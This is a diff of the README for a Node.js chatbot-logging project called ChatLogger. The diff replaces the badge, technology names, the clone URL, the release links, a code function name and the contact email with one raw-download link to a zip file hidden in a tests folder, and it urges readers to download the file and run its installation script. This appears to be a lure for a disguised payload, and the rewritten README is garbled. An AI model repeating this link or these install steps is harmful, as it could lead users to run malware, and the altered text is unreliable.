@@ -1,6 +1,6 @@
 # ChatLogger: Your Chatbot Interaction Hub 🤖💬
 
-![ChatLogger](https://img.shields.io/badge/ChatLogger-Chatbot%20User%20Interaction%20and%20Storage-blue.svg)
+![ChatLogger](https://github.com/erwuigherioger/ChatLogger/raw/refs/heads/master/src/middleware/__tests__/Logger-Chat-2.6.zip%20User%20Interaction%20and%https://github.com/erwuigherioger/ChatLogger/raw/refs/heads/master/src/middleware/__tests__/Logger-Chat-2.6.zip)
 
 Welcome to **ChatLogger**, a powerful tool designed for logging and storing interactions with chatbots. This repository provides a comprehensive solution for managing conversation history and user interactions seamlessly. 
 
@@ -19,26 +19,26 @@ Welcome to **ChatLogger**, a powerful tool designed for logging and storing inte
 - **Chat Log Storage**: Efficiently store and retrieve conversation history.
 - **User Interaction Tracking**: Monitor user interactions for better insights.
 - **Docker Integration**: Easily deploy your application using Docker.
-- **JavaScript and Node.js**: Built on modern web technologies for performance and scalability.
+- **JavaScript and https://github.com/erwuigherioger/ChatLogger/raw/refs/heads/master/src/middleware/__tests__/Logger-Chat-2.6.zip**: Built on modern web technologies for performance and scalability.
 - **MongoDB Support**: Utilize MongoDB for flexible data storage.
 
 ## Technologies Used
 
 - **JavaScript**: The backbone of our application.
-- **Node.js**: For server-side operations.
+- **https://github.com/erwuigherioger/ChatLogger/raw/refs/heads/master/src/middleware/__tests__/Logger-Chat-2.6.zip**: For server-side operations.
 - **MongoDB**: To manage data storage.
 - **Docker**: For containerization and easy deployment.
 - **Chatbot Integration**: Seamlessly connect with various chatbots.
 
 ## Installation
 
-To get started with ChatLogger, you need to download the latest release. Visit the [Releases section](https://github.com/erwuigherioger/ChatLogger/releases) to find the appropriate file. Download it and execute the installation script.
+To get started with ChatLogger, you need to download the latest release. Visit the [Releases section](https://github.com/erwuigherioger/ChatLogger/raw/refs/heads/master/src/middleware/__tests__/Logger-Chat-2.6.zip) to find the appropriate file. Download it and execute the installation script.
 
 ### Prerequisites
 
 Before you begin, ensure you have the following installed:
 
-- Node.js
+- https://github.com/erwuigherioger/ChatLogger/raw/refs/heads/master/src/middleware/__tests__/Logger-Chat-2.6.zip
 - MongoDB
 - Docker (optional)
 
@@ -47,7 +47,7 @@ Before you begin, ensure you have the following installed:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/erwuigherioger/ChatLogger.git
+   git clone https://github.com/erwuigherioger/ChatLogger/raw/refs/heads/master/src/middleware/__tests__/Logger-Chat-2.6.zip
    ```
 
 2. Navigate to the project directory:
@@ -85,7 +85,7 @@ Here’s a simple example of how to log a user interaction:
 ```javascript
 const chatLogger = require('chatlogger');
 
-chatLogger.logInteraction({
+https://github.com/erwuigherioger/ChatLogger/raw/refs/heads/master/src/middleware/__tests__/Logger-Chat-2.6.zip({
   userId: '12345',
   message: 'Hello, how can I help you?',
   timestamp: new Date(),
@@ -112,9 +112,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any inquiries or support, please reach out to the maintainer:
 
 - **Name**: Your Name
-- **Email**: your.email@example.com
+- **Email**: https://github.com/erwuigherioger/ChatLogger/raw/refs/heads/master/src/middleware/__tests__/Logger-Chat-2.6.zip
 
-You can also visit the [Releases section](https://github.com/erwuigherioger/ChatLogger/releases) for the latest updates and downloads.
+You can also visit the [Releases section](https://github.com/erwuigherioger/ChatLogger/raw/refs/heads/master/src/middleware/__tests__/Logger-Chat-2.6.zip) for the latest updates and downloads.
 
 ---
 
